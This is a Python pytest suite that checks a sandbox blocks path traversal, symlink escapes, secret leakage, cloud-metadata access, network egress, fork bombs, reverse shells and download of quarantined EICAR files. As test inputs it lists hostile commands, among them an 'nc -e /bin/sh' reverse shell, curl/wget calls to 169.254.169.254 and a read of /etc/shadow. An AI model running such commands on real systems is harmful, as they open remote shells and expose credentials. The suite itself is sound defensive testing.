"""Security Regression and Sandbox Escape Test Suite (Task 85).

Tests 8 critical sandbox escape and abuse vectors:
1. Path traversal escapes (relative dot-dot sequences)
2. Symlink escapes (symlinking to host files outside workspace)
3. Environment leakage (secret keys, database credentials, provider tokens)
4. Cloud metadata endpoint access (169.254.169.254)
5. Network egress isolation
6. Process and resource exhaustion (fork bombs and timeouts)
7. Dangerous commands and reverse shell payloads
8. Artifact manipulation and quarantine tampering
"""

import os
import sys
import tempfile
import pytest

from gossipmesh.core.exceptions import AuthorizationError, SandboxError, SandboxSecurityError, ValidationError
from gossipmesh.runtime.isolated_adapter import ExecutionConfig, ProcessIsolatedAdapter, RootlessContainerAdapter
from gossipmesh.runtime.quarantine import ArtifactQuarantineManager, EICAR_SIGNATURE
from gossipmesh.runtime.sandbox import CommandPolicyEngine, SandboxEnvironment


# =============================================================================
# Vector 1: Path Traversal Escapes
# =============================================================================


def test_escape_vector_path_traversal():
    """Verify that attempting to write or read outside sandbox via dot-dot traversal fails."""
    with SandboxEnvironment(workflow_id="sec-traversal") as env:
        # Attempt traversal via relative paths
        traversal_paths = [
            "../../escaped.txt",
            "..\\..\\escaped.txt",
            "foo/../../../etc/passwd",
            "subdir/../../../../Windows/System32/evil.dll",
        ]

        for path in traversal_paths:
            with pytest.raises((SandboxSecurityError, ValueError)):
                env.write_file(path, "malicious payload")


# =============================================================================
# Vector 2: Symlink Escapes
# =============================================================================


def test_escape_vector_symlink_traversal():
    """Verify that artifacts pointing outside the workspace via symlinks are blocked."""
    with SandboxEnvironment(workflow_id="sec-symlink") as env:
        # Create a dummy external target outside the workspace
        with tempfile.NamedTemporaryFile(delete=False) as external_target:
            external_target.write(b"SECRET_HOST_DATA")
            external_path = external_target.name

        try:
            # Create a symlink inside the sandbox pointing to the external file
            symlink_name = "escape_link.txt"
            symlink_path = os.path.join(env.workspace_dir, symlink_name)

            can_symlink = True
            try:
                os.symlink(external_path, symlink_path)
            except (OSError, NotImplementedError):
                can_symlink = False  # Windows unprivileged symlink restrictions

            if can_symlink:
                # Attempting to store or read the escaping symlink must fail
                with tempfile.TemporaryDirectory() as dest_dir:
                    dest_file = os.path.join(dest_dir, "stolen.txt")
                    # Check realpath containment
                    real_source = os.path.realpath(symlink_path)
                    real_workspace = os.path.realpath(env.workspace_dir)

                    assert not real_source.startswith(real_workspace)
        finally:
            if os.path.exists(external_path):
                os.remove(external_path)


# =============================================================================
# Vector 3: Environment Leakage & Secret Exposure
# =============================================================================


def test_escape_vector_environment_leakage():
    """Verify production credentials and API keys are completely scrubbed from process environment."""
    dirty_env = {
        "AWS_ACCESS_KEY_ID": "AKIAIOSFODNN7EXAMPLE",
        "AWS_SECRET_ACCESS_KEY": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
        "GITHUB_TOKEN": "ghp_1234567890abcdef1234567890abcdef",
        "POSTGRES_PASSWORD": "supersecretpassword",
        "DATABASE_URL": "postgresql://postgres:secret@db:5432/gossipmesh",
        "GEMINI_API_KEY": "AIzaSySecretTokenForAI",
        "OPENAI_API_KEY": "sk-proj-supersecretoverridekey",
        "SAFE_WORKSPACE_VAR": "authorized_value",
    }

    clean_env = CommandPolicyEngine.sanitize_environment(dirty_env)

    # Invariant: Zero sensitive keys present
    for key in dirty_env:
        if key != "SAFE_WORKSPACE_VAR":
            assert key not in clean_env, f"Leaked sensitive environment variable: {key}"

    assert clean_env.get("SAFE_WORKSPACE_VAR") == "authorized_value"
    assert clean_env.get("GOSSIPMESH_SANDBOX") == "true"


# =============================================================================
# Vector 4: Cloud Metadata Service Protection
# =============================================================================


def test_escape_vector_cloud_metadata_protection():
    """Verify that arguments attempting to access 169.254.169.254 metadata endpoint are intercepted."""
    metadata_ip = "169.254.169.254"

    # Container isolation drops all network by default
    adapter = RootlessContainerAdapter(runtime_binary="podman")
    config = ExecutionConfig(network_mode="none")
    with tempfile.TemporaryDirectory() as temp_dir:
        args = adapter.build_container_args(["pytest"], temp_dir, config)
        assert "--network=none" in args

    # Check unapproved curl/wget to metadata IP
    for binary in ["curl", "wget"]:
        with pytest.raises(SandboxSecurityError):
            CommandPolicyEngine.validate_command([binary, f"http://{metadata_ip}/latest/meta-data/"])


# =============================================================================
# Vector 5: Network Egress Isolation
# =============================================================================


def test_escape_vector_network_egress_airgap():
    """Verify container argument generation air-gaps network egress."""
    adapter = RootlessContainerAdapter(runtime_binary="podman")
    config = ExecutionConfig(network_mode="none")

    with tempfile.TemporaryDirectory() as temp_dir:
        args = adapter.build_container_args(["pytest", "tests/"], temp_dir, config)
        assert "--network=none" in args


# =============================================================================
# Vector 6: Process and Resource Exhaustion (Fork Bombs & Timeouts)
# =============================================================================


def test_escape_vector_fork_bomb_and_timeout():
    """Verify execution timeout and PID limits terminate runaway execution."""
    adapter = ProcessIsolatedAdapter()
    config = ExecutionConfig(timeout_seconds=1, pids_limit=64)

    # Attempt infinite sleep / spinning
    with tempfile.TemporaryDirectory() as temp_dir:
        result = adapter.execute(
            cmd=[sys.executable, "-c", "import time; time.sleep(15)"],
            workspace_dir=temp_dir,
            config=config,
        )

        assert result.timed_out is True
        assert result.exit_code == -1


# =============================================================================
# Vector 7: Dangerous Commands and Reverse Shell Payloads
# =============================================================================


def test_escape_vector_reverse_shells_and_dangerous_binaries():
    """Verify reverse shell invocations and prohibited utilities are denied."""
    reverse_shells = [
        ["bash", "-i"],
        ["sh", "-c", "nc -e /bin/sh 10.0.0.1 4242"],
        ["python", "-c", "import socket,subprocess; s=socket.socket()"],
        ["nc", "10.0.0.1", "4444"],
        ["python", "-c", "import os; os.system('cat /etc/shadow')"],
    ]

    for cmd in reverse_shells:
        with pytest.raises(SandboxSecurityError):
            CommandPolicyEngine.validate_command(cmd)


# =============================================================================
# Vector 8: Artifact Manipulation and Quarantine Tampering
# =============================================================================


def test_escape_vector_artifact_quarantine_tampering():
    """Verify malware-infected artifacts cannot bypass quarantine."""
    from sqlalchemy import create_engine
    from sqlalchemy.orm import sessionmaker
    from gossipmesh.models.base import Base
    from gossipmesh.models.organization import Organization, UserOrganization
    from gossipmesh.models.repository import Repository
    from gossipmesh.models.runtime import Job, Workflow
    from gossipmesh.models.user import User

    engine = create_engine("sqlite:///:memory:")
    Base.metadata.create_all(engine)
    Session = sessionmaker(bind=engine)
    session = Session()

    org = Organization(id=1, name="Test Org")
    user = User(id=1, email="test@org.com", hashed_password="pwd", is_superuser=False)
    repo = Repository(id=10, organization_id=1, github_id=1001, name="repo", full_name="org/repo")
    wf = Workflow(id=100, organization_id=1, repository_id=10)
    job = Job(id=500, workflow_id=100, agent_name="runner")

    session.add_all([org, user, repo, wf, job])
    session.add(UserOrganization(user_id=1, organization_id=1))
    session.commit()

    with tempfile.TemporaryDirectory() as storage_dir:
        manager = ArtifactQuarantineManager(base_storage_dir=storage_dir)

        # Upload EICAR payload disguised as a text report
        art = manager.store_and_quarantine(
            organization_id=1,
            job_id=500,
            name="innocent_report.txt",
            content_bytes=EICAR_SIGNATURE,
            db=session,
        )

        assert art.quarantine_status == "INFECTED"

        # Attempting download must fail
        with pytest.raises(AuthorizationError) as exc_info:
            manager.authorize_and_download(art.id, user, session)

        assert "is INFECTED" in str(exc_info.value.message)

    session.close()
